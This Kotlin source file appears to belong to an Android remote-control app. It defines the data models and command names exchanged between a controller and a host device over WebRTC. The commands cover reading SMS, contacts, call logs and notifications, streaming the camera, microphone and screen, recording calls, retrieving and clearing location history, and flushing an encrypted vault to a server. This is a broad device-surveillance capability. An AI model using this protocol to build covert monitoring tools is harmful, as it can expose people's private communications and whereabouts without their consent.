package com.remotebridge.core.model

import kotlinx.serialization.Serializable
import kotlinx.serialization.json.JsonObject

/**
 * النماذج المشتركة بين الجهازين عبر قناة WebRTC.
 * كلها قابلة للتسلسل إلى JSON عبر kotlinx.serialization.
 */

@Serializable
data class HostInfo(
    val deviceId: String,
    val deviceName: String,
    val online: Boolean = true
)

@Serializable
data class FileItem(
    val id: Long,
    val name: String,
    val size: Long,
    val mimeType: String,
    val dateAdded: Long,
    val bucket: String,
    val width: Int = 0,
    val height: Int = 0,
    val durationMs: Long = 0
)

@Serializable
data class SmsMessage(
    val id: Long,
    val threadId: Long,
    val address: String,
    val body: String,
    val date: Long,
    val type: Int,
    val contactName: String? = null
)

@Serializable
data class ContactItem(
    val id: Long,
    val displayName: String,
    val phoneNumbers: List<String>,
    val emails: List<String>
)

@Serializable
data class CallLogItem(
    val id: Long,
    val number: String,
    val date: Long,
    val durationSec: Long,
    val type: Int
)

@Serializable
data class NotificationItem(
    val id: String,
    val packageName: String,
    val title: String,
    val text: String,
    val postTime: Long
)

@Serializable
data class DeviceInfo(
    val deviceName: String,
    val manufacturer: String,
    val model: String,
    val androidVersion: String,
    val sdkInt: Int,
    val batteryLevel: Int,
    val isCharging: Boolean,
    val storageTotalBytes: Long,
    val storageFreeBytes: Long
)

@Serializable
data class BucketInfo(
    val id: String,
    val name: String
)

/**
 * طلب يُرسله جهاز التحكم إلى الجهاز المضيف عبر قناة البيانات.
 * [id] يُستخدم لمطابقة الطلب مع الرد.
 */
@Serializable
data class BridgeRequest(
    val id: Int,
    val cmd: String,
    val params: JsonObject? = null
)

/**
 * ردّ الجهاز المضيف على طلب جهاز التحكم.
 * [data] يحوي النتائج (قوائم، بيانات وصفية).
 */
@Serializable
data class BridgeResponse(
    val id: Int,
    val ok: Boolean,
    val error: String? = null,
    val data: JsonObject? = null
)

/**
 * أوامر البروتوكول المتفق عليها بين الجهازين.
 */
object Commands {
    const val PING = "ping"
    const val DEVICE_INFO = "device_info"
    const val STORAGE_BUCKETS = "storage_buckets"
    const val STORAGE_EXPLORE = "storage_explore"
    const val FILE_LIST = "file_list"
    const val FILE_OPEN = "file_open"
    const val FILE_THUMBNAIL = "file_thumbnail"
    const val SMS_LIST = "sms_list"
    const val CONTACTS_LIST = "contacts_list"
    const val CALLS_LIST = "calls_list"
    const val NOTIFICATIONS_LIST = "notifications_list"
    const val START_CAMERA_STREAM = "start_camera_stream"
    const val START_AUDIO_STREAM = "start_audio_stream"
    const val START_SCREEN_STREAM = "start_screen_stream"
    const val STOP_CAMERA_STREAM = "stop_camera_stream"
    const val SWITCH_CAMERA = "switch_camera"
    const val TOGGLE_AUDIO = "toggle_audio"
    const val MEDIA_FOLDERS = "media_folders"
    const val MEDIA_ITEMS = "media_items"
    const val SCREENSHOT = "screenshot"
    const val REC_START = "rec_start"
    const val REC_STOP = "rec_stop"
    const val RECORDINGS_LIST = "recordings_list"
    const val LOCATIONS_GET = "locations_get"
    const val LOCATIONS_CLEAR = "locations_clear"
    // B4 — تسجيل المكالمات + تدفق الخزنة المشفرة إلى الخادم
    const val CALL_RECORD_SET = "call_record_set"
    const val VAULT_FLUSH = "vault_flush"
}

/**
 * معرّفات صناديق التخزين (مجلدات الوسائط).
 */
object Buckets {
    const val IMAGES = "images"
    const val VIDEOS = "videos"
    const val AUDIO = "audio"
    const val DOWNLOADS = "downloads"
    const val DOCUMENTS = "documents"

    val all = listOf(IMAGES, VIDEOS, AUDIO, DOWNLOADS, DOCUMENTS)
}

/**
 * أدوار الجهاز في الشبكة.
 */
enum class Role { Host, Controller }
